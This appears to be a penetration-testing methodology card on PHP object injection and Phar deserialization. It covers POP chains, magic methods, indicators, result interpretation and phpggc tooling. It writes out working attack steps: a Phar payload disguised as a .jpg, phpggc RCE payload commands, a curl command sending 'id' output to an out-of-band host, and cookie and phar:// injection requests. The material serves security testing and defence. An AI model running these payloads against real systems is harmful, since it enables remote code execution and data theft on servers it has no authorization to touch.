# PHP Object Injection / Phar Deserialization

## Purpose

Test PHP applications that pass user-controlled strings to `unserialize()` or trigger Phar metadata deserialization through stream wrappers, enabling code execution through POP chains via magic methods (`__wakeup`, `__destruct`, `__toString`, `__call`).

## Applicability

- PHP application (Laravel, Symfony, WordPress, Drupal, custom)
- Cookie, session, or parameter value contains PHP serialized string (`O:`, `a:`, `s:`)
- File operations accepting user-supplied paths that may be rewritten to `phar://`
- Application accepts file uploads followed by file operations on the uploaded path

## Preconditions

- **Object injection**: User-controlled data reaches `unserialize()` without cryptographic HMAC verification, OR the HMAC is bypassable
- **Phar deserialization**: User-controlled string (path, URL) is passed to a filesystem function (`file_exists`, `is_file`, `fopen`, `include`, `require`, `getimagesize`, `imagecreatefromgif`, etc.) after being rewritten or constructed from user input
- Target classpath (autoloaded framework classes) contains gadget chain for `__wakeup`/`__destruct`

## Relevant Architecture

**unserialize() path**
```
User input (cookie / POST / GET)
    → base64 decode (optional)
    → unserialize($data)
    → PHP reconstructs object graph
    → __wakeup() called (if defined)
    → on script end: __destruct() called on all objects
    → gadget chain → system() / exec() / file_write / RCE
```

**Phar deserialization path**
```
User uploads file (renamed to safe extension, e.g., .jpg)
    → stored at /uploads/user.jpg
    → application runs file_exists("phar:///uploads/user.jpg")
        (or attacker controls path parameter → phar:// prefix)
    → PHP deserializes Phar metadata
    → same __wakeup / __destruct gadget chain → RCE
```

## Technical Knowledge

**PHP serialization format**
```
O:8:"stdClass":1:{s:3:"foo";s:3:"bar";}
^  ^ class name len/name  ^ property count ^ property definitions

a:2:{i:0;s:5:"hello";i:1;i:42;}     // array
s:6:"secret";                         // string
b:1;                                   // bool true
N;                                     // null
```

**Magic methods invoked during deserialization**

| Method | Trigger |
|--------|---------|
| `__wakeup()` | Called immediately after `unserialize()` |
| `__destruct()` | Called when object is garbage collected (end of script) |
| `__toString()` | Called when object used in string context |
| `__call()` | Called on undefined method invocation |
| `__get()` | Called on property access of undefined property |

**POP chain concept**

A Property-Oriented Programming chain uses existing class properties and magic methods to chain calls across framework classes until reaching a dangerous primitive. Each class is an existing part of the application or its dependencies.

**phpggc — framework gadget chains**

| Framework | Chain examples |
|-----------|---------------|
| Laravel | `Laravel/RCE1-9`, `Laravel/FD1`, `Laravel/Info1` |
| Symfony | `Symfony/RCE1-9`, `Symfony/FW1` |
| WordPress | `WordPress/RCE1` |
| Drupal | `Drupal/FD1` |
| Monolog | `Monolog/RCE1-3` |
| Guzzle | `Guzzle/FD1`, `Guzzle/RCE1` |
| Slim | `Slim/RCE1` |

**Phar creation for deserialization**
```php
<?php
// Create a Phar file with malicious metadata
// Run on controlled PHP instance
$phar = new Phar("payload.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");

// Embed the POP chain object as metadata
$object = /* instantiate gadget chain object */;
$phar->setMetadata($object);
$phar->stopBuffering();
rename("payload.phar", "payload.jpg");  // disguise extension
```

**Phar stream wrapper triggers**
```php
// Any of these with "phar://" prefix deserializes metadata:
file_exists("phar:///uploads/payload.jpg")
is_file("phar:///uploads/payload.jpg")
fopen("phar:///uploads/payload.jpg", "r")
getimagesize("phar:///uploads/payload.jpg")
imagecreatefromjpeg("phar:///uploads/payload.jpg")
file_get_contents("phar:///uploads/payload.jpg")
```

## Indicators

**Black-box**
- Cookie/session value contains `O:`, `a:`, or `s:` patterns after URL/base64 decoding
- PHP error mentioning class names in unserialization context: `unserialize(): Error at offset`
- Application rebuilds object state from cookie (not JWT/session file ID)
- File upload with subsequent server-side processing using the uploaded file path

**White-box**
```php
unserialize($_COOKIE['data'])
unserialize(base64_decode($_POST['state']))
unserialize($redis->get('session:' . $userId))   // second-order
file_exists($_GET['path'])                        // path traversal to phar://
getimagesize($_FILES['upload']['tmp_name'])       // Phar with image functions
```

## Interpretation

1. **`unserialize(): Error at offset X`** when payload structure is wrong → `unserialize()` sink confirmed; fix payload format
2. **`__PHP_Incomplete_Class`** returned → class not autoloaded; either wrong namespace or class not in autoload path
3. **Object properties visible in response** → deserialization working; look for `__toString` usage or property access paths
4. **`Call to undefined method X::Y()`** during deserialization → gadget chain partially working; chain is incomplete or wrong version
5. **OOB callback received** → gadget chain reached exec/curl → RCE confirmed

## Security-Relevant Conditions

- **Cookie with `O:` pattern and no HMAC**: Directly injectable — forge any object
- **Laravel `APP_KEY` unknown**: Signed cookies protected; if key leaked from `.env` or error page, cookies forgeable
- **PHP `phar.readonly=Off`** (often the case in web contexts): Phar files creatable; metadata deserialization active
- **File upload followed by image processing functions**: Classic Phar path — upload phar disguised as `.jpg`, trigger via `getimagesize`
- **Redis/memcache storing serialized PHP objects**: If cache key partially user-controlled, second-order injection possible

## Experiment Considerations

- Generate payload with phpggc: match framework AND version — wrong chain version silently fails
- For Phar: confirm `phar.readonly = Off` is possible (it defaults to Off in CLI and often in FPM); check `phpinfo()` if accessible
- Use `Monolog/RCE` chains when Laravel/Symfony classes are unavailable — Monolog is widely used
- Test `__destruct` chains: payload effect triggers at script end, not immediately — factor into timing of observation
- OOB HTTP callback is the most reliable oracle; DNS callback if HTTP egress blocked

## Evidence Expectations

1. phpggc-generated payload injected into identified sink
2. OOB callback received → chain reached exec → RCE confirmed
3. Bounded command output (`id`, `hostname`) exfiltrated via curl OOB
4. Document: parameter/cookie name, framework name and version, gadget chain name, phpggc command used, PHP version

## Failure Interpretation

| Observation | Interpretation |
|-------------|---------------|
| `__PHP_Incomplete_Class` in response | Class not autoloaded at deserialization time; check autoload path |
| No error but no OOB callback | Chain may need `__toString` trigger; add object to string context |
| `unserialize(): Error at offset` | Payload format corrupt; regenerate with phpggc |
| Laravel `MAC mismatch` or `DecryptException` | Cookie is encrypted (not just serialized); need APP_KEY |
| Phar file_exists returns false | File not accessible at path, or Phar stream wrapper disabled |

## False Positives

- Cookie contains PHP serialized data but `unserialize()` is called on a MAC-verified value using a strong unknown key
- Serialized data is reconstructed into a fixed class with no dangerous methods (`__wakeup` is benign setter)
- `phar://` stream wrapper disabled via `allow_url_fopen` restrictions or `open_basedir` constraints
- phpggc returns no available chains for the detected framework version — absence of known chains ≠ safety, but proof of exploit requires a working chain

## Limitations

- phpggc chain availability depends on exact framework + dependency versions; version mismatches cause silent failure
- `__destruct` chains trigger at script end — if script is daemonized or pooled, timing of execution differs
- Phar Deserialization requires attacker-controlled file to be uploaded to a path reachable by a filesystem function
- PHP 8.x `unserialize()` added some hardening for certain edge cases — test on actual runtime version

## Related Knowledge

- `signed-state` — when the serialized blob is signed (Laravel encrypted cookies, Symfony signed sessions)
- `second-order` — when `unserialize()` reads from DB/cache rather than directly from request
- PHP CVE-2015-6835: `unserialize()` UAF — historical context for native engine vulns
- `phar://` Deserialization: introduced as a research class by Sam Thomas at BlackHat 2018

## Tooling

```bash
# List available chains for framework
./phpggc -l Laravel
./phpggc -l Symfony

# Generate base64-encoded payload
./phpggc -b Laravel/RCE9 system id

# OOB callback payload
./phpggc -b Laravel/RCE9 system "curl http://<interactsh-host>/?q=\$(id|base64 -w0)"

# Generate Phar file with embedded POP chain
./phpggc --phar phar -o payload.phar Laravel/RCE9 system id
cp payload.phar payload.jpg   # disguise extension

# Inject via cookie
curl -b "laravel_session=$(phpggc -b Laravel/RCE9 system id)" https://target/

# Phar trigger via path parameter
curl "https://target/api/preview?path=phar:///var/www/html/storage/app/uploads/payload.jpg"
```